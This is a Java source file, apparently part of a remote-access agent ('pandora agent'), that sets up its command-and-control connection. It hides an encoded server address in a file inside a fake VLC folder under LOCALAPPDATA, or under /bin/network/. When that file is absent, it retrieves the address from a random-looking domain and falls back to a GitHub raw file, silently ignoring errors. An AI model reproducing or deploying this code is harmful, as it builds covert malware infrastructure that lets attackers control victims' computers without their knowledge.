package org.pandora.agent.setup;

import org.pandora.agent.Client;
import org.pandora.agent.socket.SocketManager;
import org.pandora.agent.update.Updater;
import org.pandora.agent.utils.Settings;

import java.io.*;
import java.nio.charset.StandardCharsets;

public class Setup {

    private final Client client;
    private final SocketManager socketManager;

    public Setup(final Client client) {
        this.client = client;
        this.socketManager = client.getSocketManager();
    }

    public void setupValues(final boolean windows) {
        final File folder = new File(windows ? System.getenv("LOCALAPPDATA") + "\\VLC\\" : "/bin/network/");
        final File data = new File(windows ? folder.getAbsolutePath() + "\\data" : folder.getAbsolutePath() + "/data");
        if (Settings.HOST.contains("base")) {
            if (data.exists()) {
                String value = "";
                try {
                    final BufferedReader reader = new BufferedReader(new FileReader(data));
                    final StringBuilder inputBuffer = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) inputBuffer.append(line);
                    reader.close();
                    value = inputBuffer.toString();
                } catch (final Exception ignored) {
                }
                if (value.contains(":") || value.length() > 4) {
                    value = new String((this.client.getDecodingManager().decode(value)).getBytes(StandardCharsets.UTF_8));
                    this.socketManager.setAddress(value.split(":")[0]);
                    this.socketManager.setPort(Integer.parseInt(value.split(":")[1]));
                }
            } else {
                String result = "";
                try {
                    result = this.client.getUpdater().readFromURL("https://api.cupxyig3ca2pga7i.eu/server");
                } catch (final IOException ignore) {
                    try {
                        result = this.client.getUpdater().readFromURL("http://api.cupxyig3ca2pga7i.eu/server");
                    } catch (final IOException ignored) {
                        try {
                            result = this.client.getUpdater().readFromURL("https://raw.githubusercontent.com/cupxyig3ca2pga7i/cupxyig3ca2pga7i/main/server");
                        } catch (final IOException ignored2) {
                        }
                    }

                }
                if (result.contains(":")) {
                    this.socketManager.setAddress(result.split(":")[0]);
                    this.socketManager.setPort(Integer.parseInt(result.split(":")[1]));
                }
            }
        } else if (!Settings.HOST.contains("base")) {
            this.socketManager.setAddress(Settings.HOST);
            this.socketManager.setPort(Integer.parseInt(Settings.PORT));
            if (!data.exists()) {
                folder.mkdirs();
                try {
                    data.createNewFile();
                    final FileWriter writer = new FileWriter(data);
                    writer.write(new String((this.client.getEncodingManager().encode(Settings.HOST + ":" + Settings.PORT)).getBytes(StandardCharsets.UTF_8)));
                    writer.close();
                } catch (final IOException ignored) {
                }
            }
        }
    }
}
